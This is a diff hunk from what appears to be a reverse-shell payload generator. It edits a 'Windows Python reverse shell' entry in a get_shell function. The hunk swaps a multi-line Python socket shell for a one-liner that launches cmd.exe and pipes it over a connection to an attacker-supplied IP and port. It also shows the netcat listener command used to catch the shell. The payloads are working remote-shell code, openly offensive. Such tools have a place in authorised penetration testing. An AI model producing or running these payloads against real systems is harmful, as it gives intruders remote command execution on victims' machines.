@@ -359,12 +359,12 @@ def get_shell(ipaddr: str, port: int) -> dict:
         "description":
         "Windows Python reverse shell",
         "reverse":
-        "_A=True\r\nimport os,socket,subprocess,threading\r\ndef s2p(s,p):\r\n\twhile _A:\r\n\t\tdata=s.recv(1024)\r\n\t\tif len(data)>0:p.stdin.write(data);p.stdin.flush()\r\ndef p2s(s,p):\r\n\twhile _A:s.send(p.stdout.read(1))\r\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\r\ns.connect((\'%s\',%d))\r\np=subprocess.Popen([\'bash\'],stdout=subprocess.PIPE,stderr=subprocess.STDOUT,stdin=subprocess.PIPE)\r\ns2p_thread=threading.Thread(target=s2p,args=[s,p])\r\ns2p_thread.daemon=_A\r\ns2p_thread.start()\r\np2s_thread=threading.Thread(target=p2s,args=[s,p])\r\np2s_thread.daemon=_A\r\np2s_thread.start()\r\ntry:p.wait()\r\nexcept KeyboardInterrupt:s.close()"
+        "python.exe -c \"import socket,os,threading,subprocess as sp;p=sp.Popen([\'cmd.exe\'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect((\'%s\',%d));threading.Thread(target=exec,args=(\\\"while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)\\\",globals()),daemon=True).start();threading.Thread(target=exec,args=(\\\"while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)\\\",globals())).start()\""
         % (ipaddr, port),
         "listen":
         "rlwrap -cAr nc -lvnp %d" % (port),
         "type":
-        "py",
+        PLAIN,
         "platform":
         "Windows",
     }
